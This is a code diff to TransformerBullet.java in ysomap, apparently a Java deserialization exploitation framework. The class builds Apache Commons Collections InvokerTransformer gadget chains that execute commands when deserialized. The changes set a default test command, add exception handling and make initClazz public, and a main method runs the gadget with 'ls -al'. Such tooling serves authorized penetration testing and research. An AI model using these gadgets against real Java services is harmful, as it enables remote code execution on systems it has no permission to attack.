@@ -1,6 +1,7 @@
 package ysomap.gadget.bullet.collections;
 
 import ysomap.gadget.ObjectGadget;
+import ysomap.util.PayloadHelper;
 import ysomap.util.Reflections;
 
 import java.lang.reflect.Array;
@@ -23,10 +24,15 @@ public class TransformerBullet implements ObjectGadget<Object> {
 
     Class invokerTransformerClazz;
 
+
     public TransformerBullet(String[] args, int version) {
-        this.args = args;
+        this.args = args == null? PayloadHelper.defaultTestCommand() : args;
         this.version = version!=3 ? 4 : 3;
-        initClazz();
+        try {
+            initClazz();
+        } catch (ClassNotFoundException e) {
+            e.printStackTrace();
+        }
     }
 
     @Override
@@ -48,7 +54,7 @@ public class TransformerBullet implements ObjectGadget<Object> {
         this.version = version;
     }
 
-    private void initClazz(){
+    public void initClazz() throws ClassNotFoundException {
         try{
             if(version == 3){
                 transformerClazz = Class.forName("org.apache.commons.collections.Transformer");
@@ -82,6 +88,7 @@ public class TransformerBullet implements ObjectGadget<Object> {
                             new Class[]{String.class, Class[].class, Object[].class},
                             args);
     }
+
 
     public static void main(String[] args) {
         ObjectGadget bullet = new TransformerBullet(new String[]{"ls -al"},4);
